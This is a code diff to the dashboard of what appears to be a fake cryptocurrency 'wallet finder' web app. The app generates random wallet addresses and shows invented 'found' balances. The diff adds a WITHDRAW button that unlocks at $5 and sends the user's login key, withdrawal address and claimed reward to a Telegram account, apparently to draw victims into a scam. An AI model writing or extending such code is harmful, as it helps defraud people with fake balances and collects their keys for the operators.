@@ -52,6 +52,8 @@ export default function DashboardPage() {
     const [accessKeyDocId, setAccessKeyDocId] = useState<string | null>(null);
     const searchStartTimeRef = useRef<number | null>(null);
 
+    const totalFoundValue = foundWallets.reduce((sum, wallet) => sum + wallet.usdValue, 0);
+
     const generateWalletAddress = () => {
         const chars = '0123456789abcdef';
         let address = '0x';
@@ -469,13 +471,25 @@ export default function DashboardPage() {
                     </p>
 
                     <div className="pt-4">
-                    <Link href="https://t.me/Crypto_ice_Team" target="_blank" rel="noopener noreferrer" className="w-full">
                         <Button
-                        className="w-full text-lg font-bold bg-green-600 text-white rounded-lg px-8 py-4 transition-all duration-300 hover:bg-green-500 hover:scale-105 shadow-lg hover:shadow-green-500/30"
+                            className="w-full text-lg font-bold bg-green-600 text-white rounded-lg px-8 py-4 transition-all duration-300 hover:bg-green-500 hover:scale-105 shadow-lg hover:shadow-green-500/30 disabled:bg-gray-600 disabled:cursor-not-allowed"
+                            onClick={() => {
+                                if (!userWithdrawAddress.trim()) {
+                                    toast({
+                                        title: "Address Missing",
+                                        description: "Please enter your wallet address for withdrawal.",
+                                        variant: "destructive",
+                                    });
+                                    return;
+                                }
+                                const message = `Withdrawal Request\n\nKey: ${loginKey}\nWithdrawal Address: ${userWithdrawAddress}\nReward Amount: $${totalFoundValue.toFixed(2)}`;
+                                const telegramUrl = `https://t.me/Crypto_ice_Team?text=${encodeURIComponent(message)}`;
+                                window.open(telegramUrl, '_blank');
+                            }}
+                            disabled={totalFoundValue < 5}
                         >
-                        WITHDRAW
+                            WITHDRAW
                         </Button>
-                    </Link>
                     </div>
                 </div>
                 ) : (
@@ -486,13 +500,12 @@ export default function DashboardPage() {
                     <p className="text-center text-yellow-400 font-semibold mb-4">
                         Note: A minimum of $5.00 USD in found assets is required for withdrawal.
                     </p>
-                    <Link href="https://t.me/Crypto_ice_Team" target="_blank" rel="noopener noreferrer" className="w-full">
-                        <Button
-                        className="w-full text-lg font-bold bg-green-600 text-white rounded-lg px-8 py-4 transition-all duration-300 hover:bg-green-500 hover:scale-105 shadow-lg hover:shadow-green-500/30"
-                        >
+                    <Button
+                        className="w-full text-lg font-bold bg-green-600 text-white rounded-lg px-8 py-4 transition-all duration-300 hover:bg-green-500 hover:scale-105 shadow-lg hover:shadow-green-500/30 disabled:bg-gray-600 disabled:cursor-not-allowed"
+                        disabled
+                    >
                         WITHDRAW
-                        </Button>
-                    </Link>
+                    </Button>
                 </>
                 )}
             </div>
